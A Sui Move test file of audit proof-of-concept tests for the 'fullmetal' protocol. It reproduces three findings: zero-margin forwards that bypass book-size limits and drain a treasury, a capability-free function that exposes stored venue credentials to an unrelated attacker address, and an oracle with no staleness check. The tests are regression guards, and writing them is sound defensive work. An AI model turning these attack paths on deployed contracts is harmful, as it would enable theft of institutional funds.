#[test_only]
/// Audit PoC tests — reproduce three human-confirmed Sui Move security
/// findings in `fullmetal` so the bugs cannot silently regress.
///
///  * PoC 4696 (High) — `otc_forward::open` accepts `im_each == 0`, bypassing
///    the per-trader `book_size` risk limit. A rogue trader opens zero-margin
///    contracts of arbitrary notional; the book-size fence is never consumed,
///    and an adverse mark drains the institution's free treasury.
///  * PoC 4714 (Critical) — `rehypo_router::borrow_receipt<C, R: store>` is
///    `public fun` with NO capability check (the sibling `begin_recall_ref`
///    requires `&AdminCap`). Any caller can obtain a `&R` reference to a venue
///    credential (DeepBook SupplierCap / Suilend CToken / Navi AccountCap)
///    stashed on the institution — the credential that controls the deployed
///    funds at the venue.
///  * PoC 4698 (High) — `oracle::price` is pure `&RiskOracle`, no `&Clock`, so
///    a frozen feed is still authoritative. The keeper's `last_update_ms` is
///    written on every push but is never read by anyone: an arbitrarily stale
///    mark keeps settling and liquidating forever.
module fullmetal::audit_poc_tests;

use std::string;
use std::type_name;
use sui::clock;
use sui::coin;
use sui::test_scenario as ts;
use fullmetal::institution::{Self, Institution, AdminCap, TraderCap};
use fullmetal::oracle::{Self, RiskOracle, OracleAdminCap, KeeperCap};
use fullmetal::otc_forward::{Self, OtcForward, OtcWitness};
use fullmetal::protocol::{Self, OtcAllowlist, ProtocolCap};
use fullmetal::registry::{Self, HandleRegistry};
use fullmetal::rehypo_router as router;

const OP: address = @0x0B;
const ATTACKER: address = @0xCAFE; // a wallet with NO AdminCap / TraderCap

public struct FAKE has drop {}

/// Local OTC witness (mirrors `risk_tests::TEST_OTC`): `reserve_margin` is
/// cross-package-public and accepts any `drop` witness as long as its
/// type-name is on the `OtcAllowlist`. `OtcWitness` itself is module-private.
public struct TEST_OTC has drop {}

/// Stand-in for a venue receipt (DeepBook SupplierCap / Suilend CToken /
/// Navi AccountCap). `store` so it can be stashed as a dynamic field — this
/// is exactly the `R: store` bound on `rehypo_router::borrow_receipt`.
public struct FakeReceipt has store {
    magic: u64,
}

public struct World has drop {
    a_inst: ID, // long
    b_inst: ID, // short
    a_admin: ID,
    b_admin: ID,
    a_trader: ID,
    b_trader: ID,
    keeper: ID,
}

// ===================================================================
// shared setup
// ===================================================================

#[allow(deprecated_usage)]
fun setup(sc: &mut ts::Scenario, a_deposit: u64, b_deposit: u64): World {
    protocol::init_for_testing(sc.ctx());
    registry::init_for_testing(sc.ctx());
    oracle::init_for_testing(sc.ctx());

    // allowlist the OTC witness + register the SUI feed @ $2.00
    sc.next_tx(OP);
    let keeper_id;
    {
        let mut allow = ts::take_shared<OtcAllowlist>(sc);
        let pcap = ts::take_from_sender<ProtocolCap>(sc);
        let wname = type_name::get_with_original_ids<OtcWitness>().into_string();
        protocol::allow_otc_witness(&mut allow, &pcap, wname, sc.ctx());

        let mut oracle = ts::take_shared<RiskOracle>(sc);
        let oadmin = ts::take_from_sender<OracleAdminCap>(sc);
        let clk = clock::create_for_testing(sc.ctx());
        oracle::register_feed(&mut oracle, &oadmin, string::utf8(b"SUI"), 2_000_000, 1_000_000, &clk);
        let keeper = oracle::mint_keeper_cap(&oadmin, sc.ctx());
        keeper_id = object::id(&keeper);
        transfer::public_transfer(keeper, OP);
        clock::destroy_for_testing(clk);

        ts::return_to_sender(sc, pcap);
        ts::return_to_sender(sc, oadmin);
        ts::return_shared(allow);
        ts::return_shared(oracle);
    };

    let (a_inst, a_admin) = make_inst(sc, b"alice", a_deposit);
    let a_trader = grant(sc, a_inst, a_admin);
    let (b_inst, b_admin) = make_inst(sc, b"bobsec", b_deposit);
    let b_trader = grant(sc, b_inst, b_admin);

    World { a_inst, b_inst, a_admin, b_admin, a_trader, b_trader, keeper: keeper_id }
}

fun make_inst(sc: &mut ts::Scenario, handle: vector<u8>, deposit: u64): (ID, ID) {
    sc.next_tx(OP);
    let mut reg = ts::take_shared<HandleRegistry>(sc);
    let admin_cap = institution::create_institution<FAKE>(&mut reg, string::utf8(handle), sc.ctx());
    let inst_id = institution::admin_institution_id(&admin_cap);
    let admin_id = object::id(&admin_cap);
    transfer::public_transfer(admin_cap, OP);
    ts::return_shared(reg);

    sc.next_tx(OP);
    {
        let mut inst = ts::take_shared_by_id<Institution<FAKE>>(sc, inst_id);
        let cap = ts::take_from_sender_by_id<AdminCap>(sc, admin_id);
        let c = coin::mint_for_testing<FAKE>(deposit, sc.ctx());
        institution::deposit_treasury(&mut inst, &cap, c, sc.ctx());
        ts::return_to_sender(sc, cap);
        ts::return_shared(inst);
    };
    (inst_id, admin_id)
}

/// Grant a trader with an explicit `book_size` so the per-trader risk fence is
/// exercised (the bug is precisely that book_size is bypassable via im_each=0).
fun grant_with_book(sc: &mut ts::Scenario, inst_id: ID, admin_id: ID, book: u64): ID {
    sc.next_tx(OP);
    let mut inst = ts::take_shared_by_id<Institution<FAKE>>(sc, inst_id);
    let cap = ts::take_from_sender_by_id<AdminCap>(sc, admin_id);
    let tcap = institution::grant_trader(&mut inst, &cap, OP, book, sc.ctx());
    let tid = object::id(&tcap);
    transfer::public_transfer(tcap, OP);
    ts::return_to_sender(sc, cap);
    ts::return_shared(inst);
    tid
}

fun grant(sc: &mut ts::Scenario, inst_id: ID, admin_id: ID): ID {
    grant_with_book(sc, inst_id, admin_id, 1_000_000_000_000)
}

fun push(sc: &mut ts::Scenario, keeper_id: ID, price: u64, now_ms: u64) {
    sc.next_tx(OP);
    let mut oracle = ts::take_shared<RiskOracle>(sc);
    let keeper = ts::take_from_sender_by_id<KeeperCap>(sc, keeper_id);
    let mut clk = clock::create_for_testing(sc.ctx());
    clock::set_for_testing(&mut clk, now_ms);
    oracle::push_price(&mut oracle, &keeper, string::utf8(b"SUI"), price, &clk);
    clock::destroy_for_testing(clk);
    ts::return_to_sender(sc, keeper);
    ts::return_shared(oracle);
}

// ===================================================================
// PoC 4696 — open with im_each == 0 bypasses book_size and drains the
// institutional treasury on an adverse mark
// ===================================================================

/// Open a forward with the supplied `im_each` (the bug: 0 is permitted by
/// `otc_forward::open` even though every sibling constructor rejects it).
fun open_with_im(sc: &mut ts::Scenario, w: &World, im_each: u64) {
    sc.next_tx(OP);
    let mut a = ts::take_shared_by_id<Institution<FAKE>>(sc, w.a_inst);
    let mut b = ts::take_shared_by_id<Institution<FAKE>>(sc, w.b_inst);
    let ta = ts::take_from_sender_by_id<TraderCap>(sc, w.a_trader);
    let tb = ts::take_from_sender_by_id<TraderCap>(sc, w.b_trader);
    let allow = ts::take_shared<OtcAllowlist>(sc);
    let clk = clock::create_for_testing(sc.ctx());
    otc_forward::open<FAKE>(
        &mut a, &ta, &mut b, &tb, &allow,
        string::utf8(b"SUI"),
        100_000_000, // notional: 100 units (1e6)
        2_000_000, // entry $2.00
        im_each, // *** the bug: im_each == 0 is accepted ***
        0, // funding bps
        false, // funding_long_pays
        0, // settlement interval (settle anytime)
        0, // expiry (perpetual)
        &clk,
        sc.ctx(),
    );
    clock::destroy_for_testing(clk);
    ts::return_to_sender(sc, ta);
    ts::return_to_sender(sc, tb);
    ts::return_shared(allow);
    ts::return_shared(a);
    ts::return_shared(b);
}

#[test]
fun poc_4696_zero_im_open_bypasses_book_size_and_drains_treasury() {
    let mut sc = ts::begin(OP);
    // Alice (long): $200 deposited, but the admin grants her a TINY book size
    // of $1 — the per-trader risk limit. Bob (short): $200 deposited, also $1
    // book size (colluding counterparty, both rogue traders at the same desk).
    let w = setup(&mut sc, 200_000_000, 200_000_000);

    // Shrink both traders' book_size down to $1 (6dp = 1_000_000).
    shrink_book(&mut sc, &w, w.a_inst, w.a_admin, 1_000_000);
    shrink_book(&mut sc, &w, w.b_inst, w.b_admin, 1_000_000);

    // baseline: opening 100 units @ $2 with im_each=$1 would normally consume
    // $1 of the $1 book (deployed goes 0 -> 1) — a single contract fits.
    // But with im_each = 0 the bug lets us open WITHOUT consuming book_size.
    open_with_im(&mut sc, &w, 0);

    // *** BUG OBSERVATION 1 ***
    // Open succeeded, but Alice's deployed went 0 -> 0 — the book-size fence
    // never fired. With a correct `im_each > 0` assertion in `open`, im_each=0
    // would have aborted before reaching `reserve_margin`. With a correct
    // `im_amount > 0` assertion in `reserve_margin`, the empty reservation
    // would be rejected at the fence. Neither exists, so deployed is unchanged.
    sc.next_tx(OP);
    {
        let a = ts::take_shared_by_id<Institution<FAKE>>(&sc, w.a_inst);
        let b = ts::take_shared_by_id<Institution<FAKE>>(&sc, w.b_inst);
        let (a_book, a_deployed, _, _) = institution::trader_view(&a, OP);
        let (b_book, b_deployed, _, _) = institution::trader_view(&b, OP);
        assert!(a_book == 1_000_000, 1001); // book_size still $1
        assert!(a_deployed == 0, 1002); // *** deployed UNCHANGED — fence bypassed ***
        assert!(b_book == 1_000_000, 1003);
        assert!(b_deployed == 0, 1004); // *** Bob's book also unconsumed ***
        // And the institutional reserved pool is also 0 — no IM was fenced:
        assert!(institution::reserved_of(&a) == 0, 1005);
        assert!(institution::reserved_of(&b) == 0, 1006);
        // Equity is fully free — exactly the unprotected position the book_size
        // fence was meant to prevent.
        assert!(institution::available(&a) == 200_000_000, 1007);
        assert!(institution::available(&b) == 200_000_000, 1008);
        ts::return_shared(a);
        ts::return_shared(b);
    };

    // *** BUG OBSERVATION 2 ***
    // The contract is now live with $200 of notional on each side, but ZERO
    // margin reserved. An adverse mark to -50% makes the long owe $100 of
    // variation margin. `settle` reaches `settle_at_mark`, the loser's free
    // pool can cover it (no IM was ever fenced, all $200 is free), and the
    // payment is moved out of the institutional treasury to the counterparty.
    // Result: the $1 book_size limit was a fiction — the entire treasury bled.
    push(&mut sc, w.keeper, 1_000_000, 0); // -50% (price 2.00 -> 1.00)

    // Settle now: alice (long) owes bob $100. interval==0 means settle-anytime.
    sc.next_tx(OP);
    {
        let mut fwd = ts::take_shared<OtcForward<FAKE>>(&sc);
        let mut a = ts::take_shared_by_id<Institution<FAKE>>(&sc, w.a_inst);
        let mut b = ts::take_shared_by_id<Institution<FAKE>>(&sc, w.b_inst);
        let orc = ts::take_shared<RiskOracle>(&sc);
        let allow = ts::take_shared<OtcAllowlist>(&sc);
        let mut clk = clock::create_for_testing(sc.ctx());
        clock::set_for_testing(&mut clk, 0);
        otc_forward::settle<FAKE>(&mut fwd, &mut a, &mut b, &orc, &allow, &clk, sc.ctx());
        clock::destroy_for_testing(clk);
        ts::return_shared(fwd);
        ts::return_shared(a);
        ts::return_shared(b);
        ts::return_shared(orc);
        ts::return_shared(allow);
    };

    // *** BUG OBSERVATION 3 ***
    // Alice's treasury: $200 -> $100. Bob's treasury: $200 -> $300.
    // The book-size fence ($1) was supposed to cap Alice's aggregate loss
    // exposure at $1 of IM. With im_each=0 it never engaged, and Bob walked
    // off with $100 of institutional funds. (Open many such contracts → drain.)
    sc.next_tx(OP);
    {
        let a = ts::take_shared_by_id<Institution<FAKE>>(&sc, w.a_inst);
        let b = ts::take_shared_by_id<Institution<FAKE>>(&sc, w.b_inst);
        assert!(institution::total(&a) == 100_000_000, 1101); // long paid $100
        assert!(institution::total(&b) == 300_000_000, 1102); // short gained $100
        ts::return_shared(a);
        ts::return_shared(b);
    };

    ts::end(sc);
}

/// Set the per-trader book_size for the institution's OP-bound trader.
fun shrink_book(sc: &mut ts::Scenario, w: &World, inst_id: ID, admin_id: ID, new_size: u64) {
    sc.next_tx(OP);
    let mut inst = ts::take_shared_by_id<Institution<FAKE>>(sc, inst_id);
    let cap = ts::take_from_sender_by_id<AdminCap>(sc, admin_id);
    institution::set_book_size(&mut inst, &cap, OP, new_size, sc.ctx());
    ts::return_to_sender(sc, cap);
    ts::return_shared(inst);
    // squash unused-warning for `w`
    let _ = w.a_inst;
    let _ = w.b_inst;
}

// ===================================================================
// PoC 4714 — borrow_receipt is public + capability-free; any caller can
// obtain a &R reference to a stored venue credential
// ===================================================================

/// Mirrors `risk_tests::setup_institution` + `lock_im` + a confirmed rehypo
/// that stashes a `FakeReceipt` on the institution. Returns the venue id used.
fun setup_with_rehypo(sc: &mut ts::Scenario, deposit: u64, principal: u64): ID {
    registry::init_for_testing(sc.ctx());
    sc.next_tx(OP);
    {
        let mut reg = ts::take_shared<HandleRegistry>(sc);
        let cap = institution::create_institution<FAKE>(&mut reg, string::utf8(b"victim"), sc.ctx());
        transfer::public_transfer(cap, OP);
        ts::return_shared(reg);
    };
    sc.next_tx(OP);
    {
        let mut inst = ts::take_shared<Institution<FAKE>>(sc);
        let cap = ts::take_from_sender<AdminCap>(sc);
        institution::deposit_treasury(&mut inst, &cap, coin::mint_for_testing<FAKE>(deposit, sc.ctx()), sc.ctx());
        ts::return_to_sender(sc, cap);
        ts::return_shared(inst);
    };
    sc.next_tx(OP);
    let inst_id = {
        let inst = ts::take_shared<Institution<FAKE>>(sc);
        let id = object::id(&inst);
        ts::return_shared(inst);
        id
    };

    // Lock IM so the rehypo router's IM-only deploy policy is satisfiable.
    lock_im(sc, inst_id, principal);

    // Confirm a rehypo with a FakeReceipt — this is exactly the venue-credential
    // storage flow that 4714 is about.
    sc.next_tx(OP);
    {
        let mut inst = ts::take_shared_by_id<Institution<FAKE>>(sc, inst_id);
        let cap = ts::take_from_sender<AdminCap>(sc);
        let v = router::venue_suilend();
        let (coin_out, ticket) = router::withdraw_for_rehypo(&mut inst, &cap, v, principal, sc.ctx());
        router::confirm_rehypo<FAKE, FakeReceipt>(
            &mut inst,
            ticket,
            option::some(FakeReceipt { magic: 0xC0FFEE }),
            sc.ctx(),
        );
        // burn the coin: in a real attack the venue would have it; here we just
        // need to dispose of it so the PTB doesn't drop it.
        coin::burn_for_testing(coin_out);
        ts::return_to_sender(sc, cap);
        ts::return_shared(inst);
    };
    inst_id
}

#[allow(deprecated_usage)]
fun lock_im(sc: &mut ts::Scenario, inst_id: ID, im: u64) {
    protocol::init_for_testing(sc.ctx());
    sc.next_tx(OP);
    {
        let mut allow = ts::take_shared<OtcAllowlist>(sc);
        let pcap = ts::take_from_sender<ProtocolCap>(sc);
        let wname = type_name::get_with_original_ids<TEST_OTC>().into_string();
        protocol::allow_otc_witness(&mut allow, &pcap, wname, sc.ctx());
        ts::return_to_sender(sc, pcap);
        ts::return_shared(allow);
    };
    sc.next_tx(OP);
    {
        let mut inst = ts::take_shared_by_id<Institution<FAKE>>(sc, inst_id);
        let cap = ts::take_from_sender<AdminCap>(sc);
        let tcap = institution::grant_trader(&mut inst, &cap, OP, im, sc.ctx());
        transfer::public_transfer(tcap, OP);
        ts::return_to_sender(sc, cap);
        ts::return_shared(inst);
    };
    sc.next_tx(OP);
    {
        let mut inst = ts::take_shared_by_id<Institution<FAKE>>(sc, inst_id);
        let allow = ts::take_shared<OtcAllowlist>(sc);
        let tcap = ts::take_from_sender<TraderCap>(sc);
        institution::reserve_margin<FAKE, TEST_OTC>(
            &mut inst,
            TEST_OTC {},
            &allow,
            &tcap,
            object::id_from_address(@0xC0),
            object::id_from_address(@0xB0),
            im,
            im * 7 / 10,
        );
        ts::return_to_sender(sc, tcap);
        ts::return_shared(allow);
        ts::return_shared(inst);
    };
}

#[test]
fun poc_4714_borrow_receipt_has_no_access_control() {
    let mut sc = ts::begin(OP);
    let principal = 400u64;
    let inst_id = setup_with_rehypo(&mut sc, 1_000, principal);

    // Sanity: the receipt is stored on the institution under the Suilend slot.
    sc.next_tx(OP);
    {
        let inst = ts::take_shared_by_id<Institution<FAKE>>(&sc, inst_id);
        assert!(router::principal_of(&inst, router::venue_suilend()) == principal, 2001);
        ts::return_shared(inst);
    };

    // *** BUG OBSERVATION ***
    // The ATTACKER wallet holds NO AdminCap and NO TraderCap for `victim` —
    // they are unrelated to the institution. They call
    // `rehypo_router::borrow_receipt<C, R: store>(&inst, venue)` directly.
    // Compare the siblings:
    //   begin_recall<C, R>(inst, cap, venue)        — requires &AdminCap
    //   begin_recall_ref<C>(inst, cap, venue)      — requires &AdminCap
    //   borrow_receipt<C, R>(inst, venue)          — PUBLIC, NO cap         *** BUG ***
    // The call succeeds and hands back a &R reference to the FakeReceipt that
    // controls the deployed funds at the venue.
    sc.next_tx(ATTACKER);
    {
        let inst = ts::take_shared_by_id<Institution<FAKE>>(&sc, inst_id);
        // The attacker has no AdminCap for this institution. The call still goes
        // through — there is no `assert_admin` anywhere on this path.
        let r: &FakeReceipt = router::borrow_receipt<FAKE, FakeReceipt>(&inst, router::venue_suilend());
        // *** attacker now holds a &R reference to the venue credential ***
        assert!(r.magic == 0xC0FFEE, 2101); // proves the reference is to the stored receipt
        ts::return_shared(inst);
    };

    // The attacker is also able to read the receipt from an UNRELATED caller
    // (would let them pass the credential to a venue adapter and withdraw).
    // We demonstrate the reference is obtainable; actually draining the venue
    // requires a venue adapter (DeepBook/Suilend/Navi, external package) so it
    // is out of scope here — but the access-control leak is the root cause and
    // is what this PoC verifies.
    ts::end(sc);
}

// ===================================================================
// PoC 4698 — oracle::price has no staleness check; a frozen feed is
// still authoritative
// ===================================================================

#[test]
fun poc_4698_oracle_price_has_no_staleness_check() {
    let mut sc = ts::begin(OP);
    oracle::init_for_testing(sc.ctx());

    // Register a feed at $185.00 with clock at T0 = 0, and mint a KeeperCap.
    sc.next_tx(OP);
    {
        let mut orc = ts::take_shared<RiskOracle>(&mut sc);
        let oadmin = ts::take_from_sender<OracleAdminCap>(&mut sc);
        let mut clk = clock::create_for_testing(sc.ctx());
        clock::set_for_testing(&mut clk, 0);
        oracle::register_feed(&mut orc, &oadmin, string::utf8(b"SPCX"), 185_000_000, 1_000_000, &clk);
        let keeper = oracle::mint_keeper_cap(&oadmin, sc.ctx());
        transfer::public_transfer(keeper, OP);
        ts::return_to_sender(&mut sc, oadmin);
        clock::destroy_for_testing(clk);
        ts::return_shared(orc);
    };

    // Push a fresh price at T0 + 1s — last_update_ms becomes 1000.
    push_named(&mut sc, b"SPCX", 185_000_000, 1_000);

    // baseline: at T = 1_000 the feed is fresh; last_update_ms == 1_000.
    sc.next_tx(OP);
    {
        let orc = ts::take_shared<RiskOracle>(&sc);
        assert!(oracle::last_update_ms(&orc, string::utf8(b"SPCX")) == 1_000, 3001);
        ts::return_shared(orc);
    };

    // *** BUG OBSERVATION ***
    // The keeper goes dark. Time advances by 1 YEAR (31_536_000_000 ms) — far
    // past any sane staleness bound. A correct oracle would have
    //   assert!(clock.timestamp_ms() - feed.last_update_ms <= MAX_STALE)
    // in `price`. This oracle's `price` is pure `&RiskOracle` (no `&Clock`),
    // so it CANNOT check staleness. The frozen mark is still returned and still
    // authoritative for settle / settle_on_breach / close / compute_net.
    sc.next_tx(OP);
    {
        let mut clk = clock::create_for_testing(sc.ctx());
        clock::set_for_testing(&mut clk, 31_536_000_000);
        let orc = ts::take_shared<RiskOracle>(&sc);
        // Returns the stale price, no abort. The frozen feed is still live.
        let p = oracle::price(&orc, string::utf8(b"SPCX"));
        assert!(p == 185_000_000, 3101); // *** frozen price still authoritative ***
        // The age (1 year) is immaterial: price() never looked at it.
        clock::destroy_for_testing(clk);
        ts::return_shared(orc);
    };

    // *** downstream impact: settle keeps billing against the frozen mark ***
    // The same stale `oracle::price` call drives `otc_forward::settle` (line
    // 326), `settle_on_breach` (line 427), and `close` (line 538). With no
    // staleness gate, a dead keeper lets the mark freeze forever while funding
    // accrues and MM-breach liquidations fire on the stale price — exactly the
    // reviewer's "预言机未检查价格更新" concern. We assert the symptom: the
    // age grew by 1 year and the returned price did not move.
    sc.next_tx(OP);
    {
        let orc = ts::take_shared<RiskOracle>(&sc);
        let age_ms = 31_536_000_000u64; // 1 year
        let last = oracle::last_update_ms(&orc, string::utf8(b"SPCX"));
        // last_update_ms was NOT touched by `price` — it is still 1_000.
        assert!(last == 1_000, 3201);
        // ... yet price() still returned the stale 185_000_000.
        // A staleness check `now - last_update_ms <= MAX_STALE` (e.g. MAX_STALE
        // = 60s) would abort here because age_ms >> MAX_STALE. The bug is the
        // absence of any such check — confirmed by the call succeeding.
        assert!(age_ms > 60_000, 3202); // 1 year >> 1 minute
        ts::return_shared(orc);
    };

    ts::end(sc);
}

fun push_named(sc: &mut ts::Scenario, sym: vector<u8>, price: u64, now_ms: u64) {
    sc.next_tx(OP);
    let mut orc = ts::take_shared<RiskOracle>(sc);
    let keeper = ts::take_from_sender<KeeperCap>(sc);
    let mut clk = clock::create_for_testing(sc.ctx());
    clock::set_for_testing(&mut clk, now_ms);
    oracle::push_price(&mut orc, &keeper, string::utf8(sym), price, &clk);
    clock::destroy_for_testing(clk);
    ts::return_to_sender(sc, keeper);
    ts::return_shared(orc);
}
